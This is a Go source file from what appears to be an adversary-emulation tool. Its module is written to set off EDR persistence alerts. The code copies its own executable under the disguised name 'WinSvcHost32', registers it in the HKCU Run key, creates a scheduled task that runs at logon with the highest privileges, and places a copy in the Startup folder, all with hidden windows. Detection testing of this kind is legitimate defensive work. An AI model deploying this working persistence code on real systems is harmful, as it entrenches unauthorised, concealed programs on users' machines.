//go:build windows

package main

// Module 3: Persistence Installation
// MITRE: T1547.001 (Registry Run Keys), T1053.005 (Scheduled Task), T1547.001 (Startup Folder)
// Triggers: Vision One Suspicious Behavior persistence alerts

import (
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

const artifactName = "WinSvcHost32"

func installPersistence() {
	logf("MODULE 3: Persistence Installation")
	logf("  Techniques: T1547.001 (Registry/Startup), T1053.005 (Scheduled Task)")

	exePath, err := os.Executable()
	if err != nil {
		logf("  Could not resolve own path: %v", err)
		return
	}

	appdata := os.Getenv("APPDATA")

	// Destination for the persistent copy
	persistPath := filepath.Join(appdata, "Microsoft", "Windows", artifactName+".exe")
	if err := copyFile(exePath, persistPath); err != nil {
		logf("  Warning: could not copy to AppData: %v", err)
		persistPath = exePath // fall back to running from current location
	} else {
		logf("  Persistent copy: %s", persistPath)
	}

	// 1. Registry Run Key (HKCU — no admin required)
	runHidden("reg.exe", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", artifactName,
		"/t", "REG_SZ",
		"/d", persistPath,
		"/f",
	)
	logf("  Registry: HKCU\\...\\Run\\%s", artifactName)

	// 2. Scheduled Task (ONLOGON, highest privilege)
	runHidden("schtasks.exe", "/Create",
		"/TN", artifactName,
		"/TR", `"`+persistPath+`"`,
		"/SC", "ONLOGON",
		"/RL", "HIGHEST",
		"/F",
	)
	logf("  Scheduled task: %s (ONLOGON, HIGHEST)", artifactName)

	// 3. Startup Folder (no admin required — per-user startup)
	startupDir := filepath.Join(appdata, "Microsoft", "Windows",
		"Start Menu", "Programs", "Startup")
	startupCopy := filepath.Join(startupDir, artifactName+".exe")
	if err := copyFile(exePath, startupCopy); err != nil {
		logf("  Warning: startup folder copy failed: %v", err)
	} else {
		logf("  Startup folder: %s", startupCopy)
	}

	logf("  Expect: Vision One T1547.001 and T1053.005 persistence alerts")
}

// runHidden executes a command with no visible window
func runHidden(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
